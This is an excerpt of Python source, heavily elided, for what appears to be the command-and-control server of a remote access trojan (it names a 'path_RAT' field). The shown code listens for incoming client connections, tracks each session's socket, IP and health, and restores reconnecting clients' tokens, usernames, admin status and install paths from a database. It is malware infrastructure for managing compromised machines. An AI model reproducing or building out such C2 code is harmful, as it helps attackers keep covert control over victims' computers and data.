...
class Handler(threading.Thread):
    ...
    dict_conn = (
        {}
    )  # dict of list | dict = socket,address  Stores all socket, ip, port and connection health status.
    ...
    PBKDF2_Key = (
        None  # Generates the key to encrypt and decrypt data using the XOR algorithm.
    )
    start_handler = False
    ...
    def run(self):
        ...
        while True:
            ...
            try:
                ...
                printColor(
                    "error",
                    "[-] Port {} is already busy or you don't have permission to listen on this port !".format(
                        self.port
                    ),
                )
                ...
                printColor(
                    "information",
                    "[?] The server will try again to listen on port {}. If the server is still unable to listen on the port {} make sure to check which service is blocked with: netstat -petulan |grep {} command.".format(
        ...
        self.sock_server.listen(
            5
        )  # https://stackoverflow.com/questions/41595176/accept-unlimited-connections-with-socket

        printColor(
            "information", "[+] the server listens on the port {}".format(self.port)
        )
...
class HandShake(threading.Thread):
    ...
    def recvFirstInfo(self):
        ...
        while True:
            ...
            if (
                tmp[0] == "MOD_RECONNECT"
            ):  # MOD_RECONNECT  | TOKEN fdsafafsdfsadf3454sdfasdf5
                token = tmp[1]
                if bool(Handler.dict_conn):
                    for target in Handler.dict_conn.values():
                        if (
                            target[NB_TOKEN] == token
                            and target[NB_IP] == self.address[0]
                        ):  # if the token is already in the dictionary it means that the client is trying to reconnect. This information is thus well stored in the db.
                            # print("!!!!Token doublon!!!!")

                            if not (
                                target[NB_ALIVE]
                            ):  # if target is not already alive:
                                """
                ...
                if max_error > 4:  # 4 error max
                    printColor(
                        "error",
                        "[-] too many errors occurred when receiving information from the client.\n",
                    )
                    break
                else:
                    max_error += 1
    ...
    def run(self):
        ...
        if bool(info):  # if not empty
            if type(info) == list:
                ...
                Handler.dict_conn[Handler.number_conn] = [
                    Handler.number_conn,
                    self.conn,
                    self.address[0],
                    int(self.address[1]),
            ...
            if type(info) == tuple:  # If the client tries to reconnect: | return Bool
                ...
                if Handler.status_connection_display:  # A TESTER !!
                    printColor(
                        "information",
                        "[+] A client is trying to reconnect to the server: session: {} {}:{}".format(
                            nb_session, self.address[0], self.address[1]
                        ),
                    )
                ...
                Handler.dict_conn[nb_session][NB_ADMIN] = self.ObjSql.returnValue(
                    nb_session, "is_he_admin"
                )
                Handler.dict_conn[nb_session][NB_PATH] = self.ObjSql.returnValue(
                    nb_session, "path_RAT"
                )
                Handler.dict_conn[nb_session][NB_USERNAME] = self.ObjSql.returnValue(
                    nb_session, "username"
                )
                Handler.dict_conn[nb_session][NB_TOKEN] = self.ObjSql.returnValue(
                    nb_session, "token"
                )
